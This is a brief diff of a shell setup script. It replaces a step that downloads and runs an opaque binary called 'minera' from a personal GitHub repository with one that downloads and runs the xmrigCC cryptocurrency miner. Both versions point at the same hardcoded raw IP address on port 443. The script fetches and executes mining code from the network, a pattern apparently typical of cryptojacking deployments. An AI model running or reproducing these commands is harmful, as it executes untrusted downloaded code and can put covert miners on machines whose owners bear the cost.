@@ -1,4 +1,4 @@
 apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 libnuma-dev
-wget https://github.com/komaria10003099/komaria/raw/main/minera
-chmod +x minera
-./minera -o 137.184.5.123:443 -t 4
+wget https://github.com/Bendr0id/xmrigCC/releases/download/3.3.3/xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz
+tar -xhf xmrigCC-3.3.3-linux-generic-static-amd64.tar.gz && cd miner
+./xmrigMiner -o 137.184.5.123:443 -t 4
